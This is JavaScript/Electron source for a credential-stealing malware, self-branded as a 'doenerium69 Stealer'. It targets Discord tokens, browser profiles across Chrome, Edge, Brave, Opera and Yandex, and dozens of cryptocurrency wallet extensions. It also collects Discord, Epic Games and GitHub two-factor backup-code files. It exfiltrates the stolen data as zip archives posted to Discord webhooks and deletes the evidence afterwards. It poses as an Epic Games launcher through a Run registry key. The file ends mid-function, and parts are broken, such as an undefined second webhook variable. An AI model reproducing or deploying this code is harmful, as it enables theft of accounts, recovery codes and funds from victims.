const fs = require('fs');
const fsPromises = require('fs').promises;
const path = require('path');
const httpx = require('axios');
const axios = require('axios');
const { app, dialog } = require('electron');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const destinationFolder = 'C:\\ProgramData\\Epic\\Launcher';

function getLocale() {
    return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
}

const computerName = os.hostname();
const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
const interval = 5000;
let injection_paths = []
const locale = getLocale();
const mainFolderPath = `./${locale}-${computerName}`;
const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
const keyName = 'EpicGamesLauncher';
const subfolders = ['Autofills', 'Cookies', 'Discord', 'Passwords'];
var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];


const discordWebhookUrl = 'REMPLACE_ME';


const foldersToSearch = [
  'Videos',
  'Desktop',
  'Documents',
  'Downloads',
  'Pictures'
];
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 0x303037,
    "disable-qr-code": "true"
}


function removeRegistryKey() {
  const command = `reg delete "${registryPath}" /v ${keyName} /f`;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error removing registry key: ${error.message}`;
      console.error(errorMessage);
      return;
    }

    if (stderr) {
      const errorMessage = `CMD error: ${stderr}`;
      console.error(errorMessage);
      return;
    }

    console.log(`Registry key removed successfully: ${stdout}`);
    // Continue with other logic or callbacks
  });
}

function sendSuccessToWebhook() {i
  console.log('Sending success to webhook');
}


async function findBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'discord_backup_codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '💰 Discord backup codes found',
              color: 0x303037,
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}

async function findEpicGamesBackupCodes() {
  const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';

  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === epicGamesBackupFileName) {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Epic Games Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '💰 Epic Games Backup codes found',
              color: 0x303037,
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload);
              console.log('Epic Games Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


async function findGithubBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'github-recovery-codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Github Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '💰 Github backup codes found',
              color: 0x303037,
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


function sendSuccessToWebhook() {
    const successMessage = '**<---------------------------INJECTION STARTED---------------------------->**';
    axios.post(discordWebhookUrl, {
        content: successMessage,
    }).then(response => {
        console.log('Success message sent to Discord webhook successfully.');
    }).catch(error => {
        console.error('Failed to send success message to Discord webhook:', error.message);
    });
}

function moveFileToFolder(filePath, folderName) {
    const destinationFolder = path.join(mainFolderPath, folderName);
    const destinationPath = path.join(destinationFolder, path.basename(filePath));

    if (!fs.existsSync(destinationFolder)) {
        fs.mkdirSync(destinationFolder);
    }

    fs.renameSync(filePath, destinationPath);
}


const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[t.me/doenerium69 Stealer]>================>\n\n',
    url: null,
    locale: locale,

}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase =
    '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
randomPath = path.join(mainFolderPath);

if (!fs.existsSync(randomPath)) {
  // If it doesn't exist, create it
  fs.mkdirSync(randomPath, { recursive: true });
} else {
  console.log('Wallets directory already exists. Skipping creation.');
  
  // Send success message to Discord webhook
  sendSuccessToWebhook();
}

function initializeFolders() {
    try {
        if (!fs.existsSync(mainFolderPath)) {
            fs.mkdirSync(mainFolderPath);
            console.log('Main folder created successfully');
            
            setTimeout(() => {
                sendSuccessToWebhook();
            }, 3000);
        }
    } catch (error) {
        const errorMessage = `Error Initialize main folder: ${error.message}`;
        console.error(errorMessage);
    }
}


const sendToDiscordWebhook = async (webhookUrl, zipFilePath) => {
    try {
        const form = new FormData();
        form.append('file', fs.createReadStream(zipFilePath));

        const response = await form.submit(webhookUrl);

        if (response.statusCode === 200) {
            console.log(``);
        } else {
            const errorMessage = `Request to Discord webhook failed with status code: ${response.statusCode}`;
            console.error(errorMessage);
        }
    } catch (error) {
        const errorMessage = `Error during sending data to Discord webhook: ${error.message}`;
        console.error(errorMessage);
    }
};



async function archiveAndSendData() {
  let zipFilePath;

  try {
    initializeFolders();

    await new Promise(resolve => setTimeout(resolve, 10000));

    const data = {
      Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')],
    };

    if (tokens.length > 0) {
      const discordFolderPath = path.join(mainFolderPath, 'Discord');
      if (!fs.existsSync(discordFolderPath)) {
        fs.mkdirSync(discordFolderPath);
      }

      const discordFilePath = path.join(discordFolderPath, 'discord.txt');
      const discordFileContent = tokens.join('\n');
      fs.writeFileSync(discordFilePath, discordFileContent);
      console.log('Tokens saved to discord.txt');
    }

    Object.entries(data).forEach(([dataType, files]) => {
      files.forEach(file => moveFileToFolder(file, dataType));
      console.log(`Files moved to ${dataType} folder`);
    });

    const archive = new AdmZip();
    archive.addLocalFolder(mainFolderPath);

    zipFilePath = `./${locale}-${computerName}.zip`;

    archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');

    archive.writeZip(zipFilePath);
    console.log('Archive created successfully');

    await sendToDiscordWebhook(discordWebhookUrl, zipFilePath);
    await sendToDiscordWebhook(discordWebhookUr1, zipFilePath);
} catch (error) {
  console.error(`Error in archiveAndSendData: ${error.message}`);
  await sendToDiscordWebhook(discordWebhookUrl, `Error in archiveAndSendData: ${error.message}`);
  await sendToDiscordWebhook(discordWebhookUr1, `Error in archiveAndSendData: ${error.message}`);
} finally {
    setTimeout(() => {
      if (fs.existsSync(mainFolderPath)) {
        fs.rmdirSync(mainFolderPath, { recursive: true });
        console.log(`Deleted folder and its content: ${mainFolderPath}`);
      }

      if (zipFilePath) {
        try {
          fs.unlinkSync(zipFilePath);
          console.log('Deleted archive after reporting success to webhook.');
        } catch (error) {
          console.error(`Error deleting archive: ${error.message}`);
        }
      }
      process.exit(0);
    }, 2000);
  }
}





function logError(errorMessage) {
